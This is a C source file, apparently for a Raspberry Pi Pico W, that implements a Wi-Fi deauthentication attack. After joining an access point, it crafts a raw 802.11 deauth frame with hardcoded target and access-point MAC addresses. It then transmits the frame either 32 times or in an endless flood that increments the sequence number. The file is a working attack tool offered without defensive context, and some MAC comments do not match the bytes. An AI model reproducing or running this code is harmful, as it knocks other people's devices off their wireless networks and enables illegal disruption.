#include "deauth.h"

void set_payload(struct pbuf *p, const char *data, u16_t data_len)
{
    if (p != NULL && data != NULL)
    {
        if (p->len >= data_len)
        {
            // Copy the data into the payload
            memcpy(p->payload, data, data_len);
        }
        else
        {
            printf("ERROR, INSUFFICIENT SIZE\n");
        }
    }
}

bool joinAP(char *ssid, char *password)
{
    int linkStatus = 0;

    linkStatus = cyw43_wifi_link_status(&cyw43_state, CYW43_ITF_STA);
    printf("Current link status: %d\n", linkStatus);
    if (linkStatus != CYW43_LINK_JOIN)
    {
        printf("Attempting to join wifi...\n");
        printf("SSID: %s\n", ssid);
        if (cyw43_arch_wifi_connect_timeout_ms(ssid, password, CYW43_AUTH_WPA2_AES_PSK, 10000))
        {
            printf("Failed to joined network.\n");
            return false;
        }
        else
        {
            printf("Succesfully joined network.\n");
            return true;
        }
    }
    else
    {
        return true;
    }
}

void deauth_blocking(struct pbuf* p) {
    if (p != NULL) {
        sleep_ms(1000);
        printf("\nsending out deauth...\n");
        while(true) {
            printf("\nSending out: \n");
            for (int i = 0; i < p->len; i++) {
                printf("%02x ", ((uint8_t*)p->payload)[i]);
            }
            cyw43_send_ethernet(&cyw43_state, CYW43_ITF_STA, p->tot_len, (void *)p, true);
            struct ieee_80211_hdr* hdr = (struct ieee_80211_hdr*)p->payload;
            hdr->sequence_control += 0x10;
            sleep_us(300);
        }
    }
}

void deauth()
{
    struct pbuf *p = pbuf_alloc(PBUF_RAW, 26, PBUF_RAM);

    uint8_t deauthPacket[26] = {
        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0xEA, 0x28, 0x58, 0x73, 0x22, 0xC3, // reciever (target) e8:fb:e9:bc:c5:ff
        /* 10 - 15 */ 0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE, // source (ap) 18:58:80:0b:a0:77
        /* 16 - 21 */ 0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE, // BSSID (ap) 18:58:80:0b:a0:79
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };

    if (p != NULL)
    {

        set_payload(p, deauthPacket, 26);
        printf("Sending death...\n");
        printf("pbuf len: %d, payload: %p deauth: %p\n", p->tot_len, p->payload, deauthPacket);
        printf("\n\npbuf payload: ");
        for (int i = 0; i < 26; i++)
        {
            printf("%02x ", ((uint8_t*)p->payload)[i]);
        }
        printf("\n\ndeauthPacket: ");
        for (int i = 0; i < 26; i++)
        {
            printf("%02x ", deauthPacket[i]);
        }
        printf("\n\n");
        int count = 0;
        int dErr = 0;
        for (; count < 32;)
        {
            sleep_ms(500);
            dErr = cyw43_send_ethernet(&cyw43_state, CYW43_ITF_STA, p->tot_len, (void *)p, true);
            // dErr = cyw43_send_ethernet(&cyw43_state, CYW43_ITF_STA, 26, deauthPacket, false);
            if (dErr == 0)
            {
                count++;
            }
        }
        printf("Result: %d, %d frames sent\n", dErr, count);
    }
    pbuf_free(p);
}
